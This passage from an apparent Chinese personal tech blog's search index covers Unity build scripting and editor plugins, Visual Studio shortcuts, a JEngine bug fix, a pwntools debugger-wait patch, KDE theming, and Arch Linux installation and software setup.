xml_file.GetElementsByTagName(tag);       if(val == null || val.Count &lt;= 0)       &#123;           return defaultValue;       &#125;       return val[0].InnerText;   &#125;\n\n\nUnity中相关的设置Android的数字签名static void SetAndroidSign()&#123;    //设置bundle的版本号    PlayerSettings.Android.bundleVersionCode = 1;    //设置keystoreName    PlayerSettings.Android.keystoreName = &quot;keystore的路径&quot;;    //设置keystore密码    PlayerSettings.Android.keystorePass = &quot;密码&quot;;    //设置keyaliasName    PlayerSettings.Android.keyaliasName = &quot;keystore的名称&quot;;    //设置keyalias密码    PlayerSettings.Android.keyaliasPass = &quot;跟keystore密码一样&quot;;&#125;\n\n选择对应的平台//自定义平台名称public enum PLATFORM&#123;    PC = 0,    IOS = 1,    ANDROID = 2,&#125;static void SelectPlat(PLATFORM plat)&#123;    BuildTarget target = BuildTarget.StandaloneWindows64;    BuildTargetGroup targetGroup = BuildTargetGroup.Standalone;    //根据平台选择target和targetGroup    if(plat == PLATFORM.PC)    &#123;        target = BuildTarget.StandaloneWindows64;        targetGroup = BuildTargetGroup.Standalone;    &#125;    else if (plat == PLATFORM.ANDROID)    &#123;        target = BuildTarget.Android;        targetGroup = BuildTargetGroup.Android;    &#125;    else if(plat == PLATFORM.IOS)    &#123;        target = BuildTarget.iOS;        targetGroup = BuildTargetGroup.iOS;    &#125;    //选择当前平台    if(EditorUserBuildSettings.activeBuildTarget != target)    &#123;        EditorUserBuildSettings.SwitchActiveBuildTarget(targetGroup,target);    &#125;&#125;\n\n获取打包场景名称static string[] GetBuildScenes()&#123;    List&lt;string&gt; sceneArray = new List&lt;string&gt;();    foreach(EditorBuildSettingsScene e in EditorBuildSettings.scenes)    &#123;        if (e == null) continue;        if (e.enabled) sceneArray.Add(e.path);    &#125;    return sceneArray.ToArray();&#125;\n\n相关的一些设置设置com.公司名.包名PlayerSettings.SetApplicationIdentifier(BuildTargetGroup,&quot;com.公司名.包名&quot;);\n\n\n设置宏定义PlayerSettings.SetScriptingDefineSymbolsForGroup(BuildTargetGroup,&quot;宏定义&quot;)；\n\nandroid专用，设置采用IL2CPP还是MonoPlayerSettings.SetScriptingBackend(BuildTargetGroup,ScriptingImplementation.Mono2X /ScriptingImplementation.IL2CPP);\n\n\n\n打包string[] scenes = GetBuildScenes();//获取用于打包的场景BuildPipeline.BuildPlayer(scenes,&quot;输出包路径+输出包名字+后缀&quot;,BuildTarget,BuildOptions);\n\n\n\n\n\nref：https://blog.csdn.net/weixin_39677098/article/details/103917389\n","categories":["dev"],"tags":["unity3d"]},{"title":"Unity3d插件编写","url":"/2022/06/10/dev/game/u3d/%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/","content":"Unity3d插件编写如何让编辑器运行你的代码如何让编辑器运行你的代码Unity3D可以通过事件触发来执行你的编辑器代码，但是需要一些编译器参数来告知编译器何时需要触发该段代码。 [MenuItem(XXX)]声明在一个函数上方，告知编译器给Unity3D编辑器添加一个菜单项，并且当点击该菜单项的时候调用该函数。触发函数里可以编写任何合法的代码，可以是一个资源批处理程序，也可以弹出一个编辑器窗口。代码里可以访问到当前选中的内容（通过Selection类），并据此来确定显示视图。与此类似，[ContextMenu(“XXX”)]可以向你的上下文菜单中添加一个菜单项。 当你编写了一些Component脚本，当它被附属到某个GameObject时，想在编辑视图即可在Scene视图观察到效果，那么你可以把[ExecuteInEditMode]写在类上方来通知编译器，该类的OnGUI和Update等函数在编辑模式也也会被调用。我们还可以使用[AddComponentMenu(“XXX&#x2F;XXX”)]来把该脚本关联到Component菜单中，点击相应菜单项即可为GameObject添加该Component脚本。 \n开始编写编辑器为了避免不必要的包含，Unity3D的运行时和编辑器类分辨存储在不同的Assemblies里（UnityEngine和UnityEditor）。当你准备开始编写编辑器之前，你需要using UnityEditor来导入编辑器的名称空间。 有些代码可能是运行时和编辑器都需要执行的，如果你想在其中加以区分，那么可以使用#if UNITY_EDITOR … #endif宏来对编辑器代码做特殊处理。 在你开始真正编写代码之前，我认为你还需要知道所有放在命名为Editor目录下的脚本会在其它脚本之后进行编译，这方便了你去使用那些运行时的内容。而那些目录下的脚本是不能访问到Editor目录下的内容的。所以，你最好把你的编辑器脚本写在Editor目录下。\n如何创建自定义编辑器窗口创建窗口，如果想自定义一个可编辑的面板，那么你需要编写一个继承自Editor的类。通常情况下，你还需要写一个[MenuItem]来告知编译器何时打开这个面板。这个事件的回调应该是一个静态方法，并且返回一个窗口的实例。现在，当点击对应的菜单项时，会弹出一个空白的窗口。并且可以像Unity3D编辑器预制的窗口一样随意拖动和停靠。下面来看看如何来在窗口内实现想要的功能吧。\n扩展你的窗口和运行时的GUI一样，如果你需要在窗口中添加交互控件，那么必须重写OnGUI方法。具体的重写方式和运行时的GUI一样，你甚至可以使用任何扩展自原生GUI系统的插件（例如iGUI和GUIX）来简化你的插件开发流程（仅经过初步测试，更深层次的可用性尚待验证）。同时UnityEditor名称空间下的EditorGUILayout在原生GUI之上提供了一些更方便的接口和控件，让你可以轻松的使用一些编辑器特有的UI控件。 除了OnGUI外，你可能还会需要如下一些回调来触发某些具体的逻辑（完整的列表请参考官方文档）：  OnSelectionChange，但你点选物品时触发  OnFocus &#x2F;OnLostFocus，获得和失去焦点时触发 \n进一步扩展你的窗口自定义控件  和运行时GUI的使用方式一样，如果你打算自定义自己的控件，那么最简单的方式就是实现一个静态方法（也可以不是静态的），并提供一些可选参数，在方法内部根据这些参数来完成对控件的布局（就像你在OnGUI中做的一样）。  如果你打算把自定义控件实现在窗口类内部，你可以使用Partial类来更好的管理你的代码。 绘制2D内容 绘制图片  可以使用GUI.DrawTexture来完成对图片资源的绘制。 绘制基础图元 GUI本身并没有提供绘制基础图元的方法，但是可以通过一些方式来封装出这些方法。  绘制线段：通过一个像素的贴图资源配合GUI.DrawTexture和矩阵旋转来完成线段的绘制。  绘制矩形框：通过GUI.Box和样式设置来封装出对矩形框和矩形填充框。 资源选择器 EditorLayout.ObjectField控件提供一个资源选择逻辑，生成时需要指定某种资源类型。然后你可以拖动该种资源到该控件或点击控件旁边的小圆圈进行列表进行选择。 \n如何存储编辑内容你可能需要创建一个继承自SerializedObject的类来保存编辑的数据。继承自SerializedObject的对象能用于存储数据而不参与渲染，并可以最终打包到AssetBundle。 针对当前的编辑选项等内容的存储，可能需要另外一个SerializedObject类（和具体的系统设计相关）。 \n向导式的编辑窗口 在很多情况下可能你都会需要一个有很多参数的编辑面板，然后在编辑结束后有一个按钮加以确认。这你不用自己来实现，UnityEditor提供了ScriptableWizard来帮助你快捷的进行开发。 他是继承自EditorWindow的，所以他们的使用是很类似的。不过注意，当你点击确认按钮时，OnWizardCreate()会被调用。另外，ScriptableWizard.DisplayWizard可以帮助你生成并显示出该窗口。 \n如何扩展INSPECTOR面板 当你在Unity3D中点选一个对象时，Inspector面板会随即显示出此对象的属性。我们可以针对某个类型的对象扩展该面板，这在为Unity3D开发插件时是非常有用的。 \n定义INSPECTOR何时被触发 自定义的Inspector面板需要继承Editor类。由于功能相对具体，所以你无需定义代码何时被触发，对应代码会在你点击它所对应的物体时自动执行。 那么如何定义它所对应的类型呢？只需要在你的类定义之前通过编译器的命令[CustomEditor(typeof(XXX))]就可以完成这项工作了。 \n访问被编辑的对象在Inspector视图中，我们经常需要访问正在被编辑的对象。Editor类的成员变量target正是提供了这一关联。  尽管如此，需要注意target是一个Object类型的对象，具体使用时可能需要类型转换（可以使用C#的泛型来避免重复的类型转换）。 \n实现你自己的INSPECTOR界面扩展Editor与扩展EditorWindow唯一的不同在于你需要重写的是OnInspectorGUI而不是OnGUI。另外，如果你想绘制默认的可编辑项，只需调用DrawDefaultInspector即可。 \n在SCENE界面定义编辑句柄当选中一个物体的时候，可能我们希望在Scene视图里也能定义一些编辑或展现。这一工作可以通过OnSceneGUI和Handle类来完成。OnSceneGUI用来处理来自Scene视图的事件，而Handle类用来在Scene视图实现一些3D的GUI控件（例如控制对象位置的Position控制器）。 具体的使用方式可以参考官方的参考文档。 \n一些常用的功能说明 AssetDatabase.CreateAsset可以帮住你从资源目录中创建一个资源实例。  Selection.activeObject返回当前选中的对象。  EditorGUIUtility.PingObject用来实现在Project窗口中点击某一项的操作。  Editor.Repaint用来重绘界面所有的控件。  XXXImporter用来设置某种资源的具体导入设置（例如在某些情况下你需要设置导入的贴图为可读的）。 EditorUtility.UnloadUnusedAssets用于释放没有使用的资源，避免你的插件产生内存泄漏。  Event.Use用来标记事件已经被处理结束了。  EditorUtility.SetDirty用来通知编辑器数据已被修改，这样在下次保存时新的数据将被存储。 \n例子保存为CopyComponent.cs，放置在Plugin&#x2F;Editor目录下\nusing System.Collections;using System.Collections.Generic;using UnityEngine;using UnityEditor;using System;public class CopyComponent : Editor&#123;#if UNITY_EDITOR    static Component[] compoentArr;    [MenuItem(&quot;Tools/Test&quot;)]    static void DoCopyComponent()    &#123;        Debug.Log(&quot;Test&quot;)    &#125;#endif&#125;\n\n\n\n\n\n自定义快捷键一、前言在使用Unity中可能需要使用快捷键执行一些操作，或者修改Unity自带的快捷键，接下来就看一下，如何设置自定义快捷键吧。\n组合快捷键Ctrl+Shift+Q\n[MenuItem(“Custom快捷键&#x2F;Ctrl+Shift+Q %#Q”)]\nCustom快捷键： 自定义，随便写Ctrl+Shift+Q： 自定义，随便写%#Q： 快捷键设置，Ctrl&#x3D;% Shift&#x3D;# Q&#x3D;Q。。前面记得加空格.\n四、功能实例暂停编辑器：EditorApplication.isPaused &#x3D; !EditorApplication.isPaused;\n播放：EditorApplication.isPlaying &#x3D; true;\n单步执行：EditorApplication.Step();\n打开场景，并运行EditorSceneManager.OpenScene(“Assets&#x2F;Scenes&#x2F;LandInit.unity”);EditorApplication.isPlaying &#x3D; true;\n效果：\n二、快捷键大全快捷键\t指令\n%\tCTRL#   Shift&amp;\tAltLEFT/RIGHT/UP/DOWN\t箭头上下左右F1-F12\t键盘快捷键F1-F12HOME/END/PGUP/PDDN\t对应键盘的Home/End/PageUp/PageDown\n\n\n\n\n\n三、实例代码：\nusing UnityEditor;using UnityEngine;public class CustomKeys : Editor&#123;    [MenuItem(&quot;Custom快捷键/F1按键 _F1&quot;)]    static void EditorCustorkKeys1()    &#123;        Debug.Log(&quot;F1点击执行的指令&quot;);    &#125;&#125;\n\n这个就是自定义了一个F1的快捷键指令\nusing UnityEditor;using UnityEngine;public class CustomKeys : Editor&#123;    [MenuItem(&quot;Custom快捷键/Ctrl+Q %Q&quot;)]    static void EditorCustorkKeys2()    &#123;        Debug.Log(&quot;Ctrl+Q点击执行的指令&quot;);    &#125;&#125;\n\n\n\n\n\n组合快捷键Ctrl+Q\nusing UnityEditor;using UnityEngine;public class CustomKeys : Editor&#123;    [MenuItem(&quot;Custom快捷键/Ctrl+Shift+Q %#Q&quot;)]    static void EditorCustorkKeys3()    &#123;        Debug.Log(&quot;Ctrl+Shift+Q点击执行的指令&quot;);    &#125;&#125;\n\n\n\n\n\n\n\n\n\n例子写一个复制组件的插件，更方便的进行组件复制和粘贴。\nusing System.Collections;using System.Collections.Generic;using UnityEngine;using UnityEditor;using System;public class CopyComponent : Editor&#123;#if UNITY_EDITOR    static Component[] compoentArr;    [MenuItem(&quot;Tools/Component/Copy All %&amp;A&quot;)]    static void DoCopyComponent()    &#123;        Component[] allCompoents = Selection.activeGameObject.GetComponents&lt;Component&gt;();        if (allCompoents == null) return;    &#125;    [MenuItem(&quot;Tools/Component/Copy All Execpt Transform %&amp;E&quot;)]    static void DoCopyComponent_Except_1()    &#123;        Component[] allCompoents = Selection.activeGameObject.GetComponents&lt;Component&gt;();        if (allCompoents == null) return;        int length = 0;        for (int i = 0; i &lt; allCompoents.Length; i++)        &#123;            if (allCompoents[i].GetType().Name == &quot;RectTransform&quot; || allCompoents[i].GetType().Name == &quot;Transform&quot;) continue;            length++;        &#125;        if (length == 0) return;        compoentArr = new Component[length];        for (int i = 0,j = 0; i &lt; allCompoents.Length; i++)        &#123;            if (allCompoents[i].GetType().Name == &quot;RectTransform&quot; || allCompoents[i].GetType().Name == &quot;Transform&quot;) continue;            compoentArr[j] = allCompoents[i];            j++;        &#125;    &#125;    [MenuItem(&quot;Tools/Component/Paste %&amp;V&quot;)]    static void DoPasteComponent()    &#123;        if (compoentArr == null)        &#123;            return;        &#125;        GameObject targetObject = Selection.activeGameObject;        if (targetObject == null)        &#123;            return;        &#125;        for (int i = 0; i &lt; compoentArr.Length; i++)        &#123;            Component newComponent = compoentArr[i];            if (newComponent == null)            &#123;                continue;            &#125;            UnityEditorInternal.ComponentUtility.CopyComponent(newComponent);            Component oldComponent = targetObject.GetComponent(newComponent.GetType());            if (oldComponent != null) // 存在旧的组件            &#123;                if (UnityEditorInternal.ComponentUtility.PasteComponentValues(oldComponent))                &#123;                    Debug.Log(&quot;Paste Component&quot; + newComponent.GetType().ToString() + &quot; Success&quot;);                &#125;                else                &#123;                    Debug.Log(&quot;Paste Component &quot; + newComponent.GetType().ToString() + &quot; Failed&quot;);                &#125;            &#125;            else // 存在旧的组件            &#123;                if (UnityEditorInternal.ComponentUtility.PasteComponentAsNew(targetObject))                &#123;                    Debug.Log(&quot;Paste Component Overwrited&quot; + newComponent.GetType().ToString() + &quot; Success&quot;);                &#125;                else                &#123;                    Debug.Log(&quot;Paste Component Overwrited&quot; + newComponent.GetType().ToString() + &quot; Failed&quot;);                &#125;            &#125;        &#125;    &#125;#endif&#125;\n\n\n\n\n\nref: https://blog.csdn.net/q764424567/article/details/108639136\n","categories":["dev"],"tags":["unity3d"]},{"title":"Visual Studio快捷键","url":"/2022/06/05/env/vs/","content":"Visual Studio快捷键源文件与头文件互相切换。\nCtrl + K Ctrl + O \n\n\n\n\n\n代码自动对齐。\nCtrl + KCtrl + F \n\n","categories":["env"],"tags":["vs"]},{"title":"JEngine开源框架 BPath变量名称出现减号错误情况修复","url":"/2022/04/11/security/bug/JEngine_BPath_Bug/","content":"JEngine开源框架 BPath变量名称出现减号错误情况修复JEngine是一款知名的Unity3d热更游戏框架。\ngithub: https://github.com/JasonXuDeveloper/JEngine\nBug描述：若动态资源路径或者文件名称包含了减号 “-“，则会出现 BPath.cs生成的变量名称不符合C#规范，修复的PR我也已经提交，作者已经接受该PR的提交，哈哈也变成了其中一个贡献者。\nBug原因：在Assets\\Dependencies\\BundleMaster\\Editor\\BundleMasterEditor\\BuildAssetsTools.cs文件中的GeneratePathCode里，没有考虑到文件名称包含 “-“这种情况， 若出现这种字符，就会导致HotUpdateScripts\\BPath.cs文件里的BPath类的成员变量名称不符合C#命名规则。\nBug修复：在Assets\\Dependencies\\BundleMaster\\Editor\\BundleMasterEditor\\BuildAssetsTools.cs文件里的GeneratePathCode函数中，foreach中，增加一行 name &#x3D; name.Replace(“-“, “_”); 即可\n如下\nforeach (string assetPath in allAssetPaths) &#123;                    string name = assetPath.Replace(&quot;/&quot;, &quot;_&quot;);                    name = name.Replace(&quot;.&quot;, &quot;__&quot;);                    name = name.Replace(&quot;-&quot;, &quot;_&quot;);                    name = name.Replace(&quot; &quot;, &quot;__&quot;);                    name = RemoveSymbol(name);                    sb.Append(&quot;\\t\\tpublic const string &quot; + name + &quot; = \\&quot;&quot; + assetPath + &quot;\\&quot;;\\n&quot;);&#125;","categories":["security"],"tags":["bug"]},{"title":"pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案","url":"/2022/03/29/security/pwn/pwndbg/","content":"pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案解决方案那么稍微修改一下源码即可。即找到了tracer就不用在while了，直接退出循环就完事了~vim &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.6&#x2F;dist-packages&#x2F;pwnlib&#x2F;util&#x2F;proc.py，然后把wait_for_debugger函数换成下面这个。（其实只改动了一小点，所以手动修改两三行就行）\n#/usr/local/lib/python3.6/dist-packages/pwnlib/util/proc.pydef wait_for_debugger(pid, debugger_pid=None):    &quot;&quot;&quot;wait_for_debugger(pid, debugger_pid=None) -&gt; None    Sleeps until the process with PID `pid` is being traced.    If debugger_pid is set and debugger exits, raises an error.        Arguments:        pid (int): PID of the process.        Returns:        None    &quot;&quot;&quot;    t = Timeout()    with t.countdown(timeout=15):        with log.waitfor(&#x27;Waiting for debugger&#x27;) as l:            while debugger_pid:                debugger = psutil.Process(debugger_pid)                #while t.timeout and tracer(pid) is None:                # 新增加                if tracer(pid) is not None: break                try:                    debugger.wait(0.01)                except psutil.TimeoutExpired:                    pass                else:                    debugger_pid = 0            else:                while t.timeout and tracer(pid) is None:                    time.sleep(0.01)            if tracer(pid):            l.success()        elif debugger_pid == 0:            l.failure(&quot;debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)&quot;)        else:            l.failure(&#x27;Debugger did not attach to pid %d within 15 seconds&#x27;, pid)\n","categories":["security"],"tags":["issues"]},{"title":"kde毛玻璃美化","url":"/2022/03/25/env/linux/myarch/kvantum/","content":"kde毛玻璃美化kde的窗口毛玻璃主要由kvantum来设定的。\n安装kvantumsudo pacman -S kvantum# 或者# sudo pacman -S kvantum-qt5\n\n安装kvantum主题商店安装在https://store.kde.org/browse/ 搜索\nLayan kvantum theme\n\n下载之后采用kvantum进行安装主题。\nhttps://github.com/yeyushengfan258/Harmony-kdehttps://github.com/yeyushengfan258/We10XOS-kde\n\n下载完毕后，打开kvantum，然后导入所下载的主题，再选择刚安装的主题即可。\nOrchis-kde 主题安装git clone https://github.com/vinceliuice/Orchis-kdecd Orchis-kde./install.sh\n\n打开kvantum，选择刚安装的主题即可。\n","categories":["env"],"tags":["linux"]},{"title":"ArchLinux日常软件安装","url":"/2022/03/25/env/linux/myarch/software_install/","content":"安装日常软件添加archlinuxcn源，打开&#x2F;etc&#x2F;pacman.conf，在末尾加上\n[archlinuxcn]SigLevel = Optional TrustAllServer = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch\n\n更新软件仓库\nsudo pacman -Sy\n\n安装key-ring\n# 可能会安装失败sudo pacman -S archlinuxcn-keyring\n\n常用软件netease-cloud-music # 网易云音乐obs-studio     # (推荐) obs 录屏软件deepin-screen  # (推荐) deepin截屏软件mpv            # (推荐) 视频播放器okular         # (推荐) PDF查看器nomacs         # (推荐) 图片查看器ark            # (推荐) 图形化解压软件kcalc          # (推荐) 图形化计算器neofetch       # (推荐) 查看系统信息 sysinfokdenlive       # 视频剪辑软件latte-dock     # 类似于macgimp           # 修图工具typora         # 写markdownksystemlog     # 查看日志kget           # 文件下载kcolorchooser  # 取色配色工具print-manager  # 打印机管理bc # 控制台计算器net-tools (ifconfig)netdiscover (ip scan)dirp (web scan)\n\n\n\n\n\n\n\n搜狗输入法Archlinux安装搜狗拼音输入法\n安装Fcitx由于搜狗拼音输入法依赖于Fcitx，在安装搜狗拼音输入法之前，需要先行安装Fcitx，在终端窗口下直接输入\nsudo pacman -S fcitx\n\n\n即可完成安装，需要注意的是，仅仅安装这一项是不够的，这样在安装完成之后，Fcitx基本上是处于不可用的状态，我们还需要安装以下几个包\nsudo pacman -S fcitx-configtoolsudo pacman -S fcitx-gtk2 fcitx-gtk3 fcitx-qt5\n\n\n目前在Archlinux的源中，fcitx-im包组已经取消了fcitx-qt4包，但是搜狗输入法需要这个包，可以用AUR获取\nsudo pacman -S yayyay -S fcitx-qt4# 安装搜狗输入法yay -S fcitx-sogoupinyin\n\n可能的问题，出现一堆报错，说xxx已经存在，将存在的文件批量删除重新安装即可。\n安装配置工具\nsudo pacman -S fcitx-configtool\n\n配置安装完之后我们还不可以直接使用，还需要进行一定的配置，用文本编辑器打开~&#x2F;.xprofile，没有就新建，在其末尾添加以下几行：\nexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot;\n\n然后注销后重新登录，或者重启后重新登录。\nTIM所以首先要打开multilab软件源. 打开&#x2F;etc&#x2F;pacman.conf, 找到[multilab]sudo vim &#x2F;etc&#x2F;pacman.conf[multilib]Include &#x3D; &#x2F;etc&#x2F;pacman.d&#x2F;mirrorlist\n安装sudo pacman -S deepin.com.qq.office\n\n解决打不开问题:sudo pacman -S gnome-settings-daemonnohup /usr/lib/gsd-xsettings &gt; /dev/null 2&gt;&amp;1 &amp;\n\n\n解决不能输入中文sudo vim /opt/deepinwine/apps/run.sh# add:export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot;\n\nwine所以首先要打开multilab软件源. 打开&#x2F;etc&#x2F;pacman.conf, 找到[multilab][multilib]Include &#x3D; &#x2F;etc&#x2F;pacman.d&#x2F;mirrorlist\nsudo pacman -S wine wine_gecko wine-mono winetricks\n\n\n\nVirtualBox安装linux-headerssudo pacman -S linux-headers\n\n确认linux内核的版本uname -r\n\n如果和header的版本不一致，需要更新内核,否则的话会在安装virtualbox的时候报错“missing kernal module tree .解决办法根系内核: sudo pacman -S linux,.然后安装virtualbox，安装默认选项不选，我们选2，也就是virtualbox-host-modules-arch\n安装sudo pacman -Sy virtualboxsudo pacman -S virtualbox-guest-iso #附加功能\n\n如何让虚拟机屏幕分辨率可以自由调整在安装好虚拟机系统并进入之后，我们需下载一个VBoxGuestAdditions.iso(设备-&gt;安装增强功能)，然后如果是ubuntu19.10，会提示你输入密码安装，安装后即可自动调整，别的系统应该与此类似\n共享文件夹:先在设置共享文件夹, 然或进入虚拟系统中挂在.此处我选择在&#x2F;mnt下创建一个“share”目录，将刚刚的“share”目录与“share”目录关联起来\ncd /mntsudo mkdir share# 将“share”目录与“share”目录进行关联：sudo mount -t vboxsf share /mnt/share\n\n\n\n其他软件资料来自网上，根据需求，自行安装。\n#clang 大名鼎鼎的LLVM Clang C语言编译器sudo pacman -Sy clang#gdb 也就是gcc的调试工具sudo pacman -Sy gdb#cmake C语言构建工具sudo pacman -Sy cmake#pip  python的模块工具sudo pacman -Sy python-pip#kchmviewer  chm查看工具sudo pacman -Sy kchmviewer6.krita和gimp是类似的作图工具，和windows下的ps是一样的sudo pacman -Sy krita7.gimp 不多介绍和ps一样sudo pacman -Sy gimp8.obs-studio 录屏推流软件sudo pacman -Sy obs-studio 10.libreoffice 中文版本sudo pacman -Sy libreoffice-freshsudo pacman -Sy libreoffice-fresh-zh-cn11.jdk 默认最新的sudo pacman -Sy jdk#当你安装多个jdk的时候设置环境变量会提醒你#Default Java environment is already set to &#x27;java-12-jdk&#x27;#See &#x27;archlinux-java help&#x27; to change it#所以说我们只需要运行archlinux-java help这个命令就可以看到相关切换的设置了,一键切换jdk不再是梦#go 默认最新sudo pacman -Sy go#wps 金山办公软件sudo pacman -Sy wps-officesudo pacman -Sy ttf-wps-fontsyay -Sy wps-office-mimeyay -Sy wps-office-mui-zh-cn#freemind 思维导图sudo pacan -Sy freemind#xmind-zen 思维导图yay -Sy xmind-zen(如非必要不要安装这个)#filezilla 远程ftp工具sudo pacman -Sy filezilla#drawio 类似UML之类的作图工具sudo pacman -Sy drawio-desktop-bin#uget 下载管理器sudo pacman -Sy uget#网易云音乐sudo pacman -Sy netease-cloud-music#谷歌浏览器sudo pacman -Sy google-chrome#TIMsudo pacman -Sy deepin.com.qq.office#vlc播放器sudo pacman -Sy vlc#mplayer命令行播放器sudo pacman -Sy mplayer#smplayer 图像界面的播放器sudo pacman -Sy smplayer#gpick 屏幕取色工具sudo pacman -Sy gpick#htop 资源进程管理器 top命令的升级版sudo pacman -Sy htop#Evolution 邮箱 强烈推荐sudo pacman -Sy evolution#QQsudo pacman -Sy deepin.com.qq.im(qq的bug较多)#微信yay -Sy deepin-wine-wechat#百度网盘sudo pacman -Sy baidunetdisk#teamviewer 远程控制sudo pacman -Sy teamviewer#screenfetch 系统信息查看工具sudo pacman -Sy screenfetch#neofetch同screenfetchsudo pacman -Sy neofetch#lolcat 文本查看 也就是cat命令的升级版sudo pacman -Sy lolcat#可以配合screefetch使用#比如 screenfetch | lolcat，这条命令可以看到非常炫酷的效果#数据库安装mariadb#因为很多linux发行版都放弃了对mysql的支持（原因自行百度）转而支持mariadb（mysql的另一个分支），Archlinux就是其中之一，mariadb具有和mysql一模一样的操作命令，所以完全不用考虑迁移兼容的问题#注意ArchLinux安装mysql是不可行的，不要试图安装mysql，那是不成功的\t#安装mariadb \tsudo pacman -Sy mariadb\t#配置mariadb命令，创建数据库都在/var/lib/mysql/目录下面\tsudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql\t#开启mariadb 服务\tsystemctl start mariadb\t#初始化密码，期间有让你设置密码的选项，设置你自己的密码就行了，然后根据自己理解y/n就可，因为很多后面可以再修改 sudo /usr/bin/mysql_secure_installation\t#登录mariadb 和mysql命令是一样的\tmysql -u root -p    #设置开机自启动服务    systemctl start mariadb #手动启动    systemctl enable mariadb #开机自启动    systemctl disable mariadb #关闭自启动#Intellij IDEAsudo pacman -Sy intellij-idea-ultimate-edition#WebStorm 前端sudo pacman -Sy webstorm#DataGrip 数据库yay -Sy datagrip#GoLand gosudo pacman -Sy goland#PyCharm pythonsudo pacman -Sy pycharm-professional#CLionsudo pacman -Sy clion#baidupcs 百度网盘命令行版本(推荐)sudo pacman -Sy baidupcs-go-bin#输入baidupcs启动#gitter 开发者聊天交流社区软件sudo pacman -Sy gitter#opera 浏览器(未安装，感兴趣可以看看)sudo pacman -Sy opera#米聊  小米的社交聊天工具yay -Sy mitalk#vscode 微软的代码编辑器sudo pacman -Sy code#atom  github为程序员打造的编辑器sudo pacman -Sy atom#360压缩软件yay -Sy 360zip#360浏览器yay -Sy browser360#微信（未安装）yay -Sy electronic-wechat#磁盘管理工具sudo pacman -S gparted#影视处理yay -Sy davinci-resolve#为免费版本，34为studio版本可能功能更全但要付费#声音设置相关sudo pacman -Sy pavucontrol\n","categories":["env"],"tags":["linux"]},{"title":"安装 ArchLinux","url":"/2022/03/25/env/linux/myarch/archlinux_install/","content":"安装 ArchLinux目前硬件信息时间： 2022-03-25\nPlatform : Y900P 2022  i7 3070Ti   [EFI]制作Archlinux U盘启动器.开机进入Linux\n准备系统从arch linux官网下载镜像，刷到U盘里，重启进入U盘系统，具体方法，这里不过多解释，请自行百度一下。\n安装系统这里是进入到u盘里arch linux之后的操作。安装命令比较多，建议采用另一台电脑通过ssh连接方式复制粘贴命令。\n连接网络#这里采用连接wifi的形式rfkill unblock all (解除内核对设备的锁定)ip link set wlan0 upiw dev wlan0 scan | lessiw dev wlan0 connect [名称] key 0:[密码]dhclient # 获取ip 或者dhcpcd# 发现配置dns解析有误ping baidu.com # 测试网络\n\n若连接好wifi后，不能ping通百度这些，可能是DNS解析有误。\n请配置\n打开&#x2F;etc&#x2F;resolv.conf第一行添加\nnameserver 8.8.8.8\n\n打开 &#x2F;etc&#x2F;nsswitch.conf 找到hosts那行，将其改为如下\nhosts:    files dns \n\n\n\n查看是否支持uefils /sys/firmware/efi/ \n\n显示的话，就说明是支持的。\n对时timedatectl set-ntp true\n\n磁盘分区这里需要你对磁盘分区有一定了解。\n执行  lsblk 或者 fdisk -l 查看硬盘设备名\n这里采用lsblk查看自己的硬盘设备名称，比如我的。\nnvme1n1     259:0    0 476.9G  0 disk ├─nvme1n1p1 259:1    0   260M  0 part  # Windows默认EFI├─nvme1n1p2 259:2    0    16M  0 part  # Windows保留分区├─nvme1n1p3 259:3    0   200G  0 part  # Windows系统分区├─nvme1n1p4 259:4    0    64M  0 part  # Linux EFI分区├─nvme1n1p5 259:5    0   150G  0 part  # Arch Linux系统分区└─nvme1n1p6 259:6    0 126.6G  0 part  # Linux 数据分区\n\n需要分两个区,一个根目录 &#x2F;,另一个是开机系统的&#x2F;boot&#x2F;efi\n执行 fdisk &#x2F;dev&#x2F;nvme1n1 开始分区, dev&#x2F;nvme1n1 是硬盘设备名\n磁盘类型参数:\n我分区的如下\nnvme1n1p4 # 64M,用于储存efinvme1n1p5 : 150G, 用于根分区nvme1n1p6 : left, 用于数据分区\n\n\n\n格式化/boot/efi分区不能ext4格式:mkfs.ext4 /dev/nvme1n1p5mkfs.vfat -F32  /dev/nvme1n1p4\n\n挂载mount /dev/nvme1n1p5 /mntmkdir -p /mnt/boot/efimount /dev/nvme1n1p4 /mnt/boot/efi\n\n修改镜像地址可能默认是国外的，下载比较慢，跟换为国内的。\ncp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.bak\n\n打开&#x2F;etc&#x2F;pacman.d&#x2F;mirrorlist 增加\n## ChinaServer = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch\n\n\n\n安装基础包:pacman -Sy #同步pacstrap /mnt base  base-devel linux linux-firmware linux-headers vim# linux 是Linux内核\n\n生成 genfstab:genfstab -U /mnt &gt;&gt; /mnt/etc/fstab\n\n进入新系统:arch-chroot /mnt /bin/bash\n\n设置时区设置为国内上海时区\nln -sf /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime\n同步硬件时钟hwclock --systohc # 也可以[--utc]\n\n\n\n设置语言打开 &#x2F;etc&#x2F;locale.gen 取消下面两行的注释后保存\nen_US.UTF-8 UTF-8zh_CN.UTF-8 UTF-8zh_CN.GB18030 GB18030zh_CN.GBK GBKzh_CN GB2312\n\n生成语言\nlocale-gen \n\n编辑 &#x2F;etc&#x2F;locale.conf设置默认语言为英文\nLANG=en_US.UTF-8\n\n\n\n设置主机名打开&#x2F;etc&#x2F;hostname ，把主机名写进去, 我这里写入的是 arch\narch\n\n打开 &#x2F;etc&#x2F;hosts，设置hosts\n127.0.0.1     arch127.0.0.1     localhost::1           localhost\n\n\n\n设置root密码passwd root\n\n\n安装网络包:pacman -S networkmanager dhcpcd\n\n若dns有问题打开&#x2F;etc&#x2F;nsswitch.conf，找到hosts那行，将其改为如下\nhosts:    files dns \n\n\n\n安装 opensshpacman -Sy openssh\n\n根据情况\n写入服务: systemctl enable sshd启动服务: systemctl start 